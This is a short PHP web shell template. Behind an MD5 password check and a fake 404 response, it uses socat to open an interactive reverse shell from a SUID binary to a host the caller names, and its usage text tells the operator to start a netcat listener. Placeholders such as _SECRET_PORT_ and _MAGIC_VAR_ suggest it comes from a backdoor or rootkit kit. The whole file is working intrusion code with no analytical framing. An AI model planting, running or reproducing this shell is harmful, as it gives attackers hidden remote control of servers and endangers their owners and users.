<?php if(!isset($_GET["password"]) || md5($_GET["password"]) != "_PASS_"){http_response_code(404);die();}
set_time_limit(0);$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",ENT_QUOTES,"UTF-8");
if(!isset($_GET["host"])) die("<h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host&host=[destination of listener]");
$ip=$_GET["host"];$write_a=null;$error_a=null;$shell="socat exec:'_SUID_BIN_',pty,stderr,setsid,sigint,sane tcp:$ip:_SECRET_PORT_";putenv("_MAGIC_VAR_=1");chdir("/");umask(0);exec($shell);?>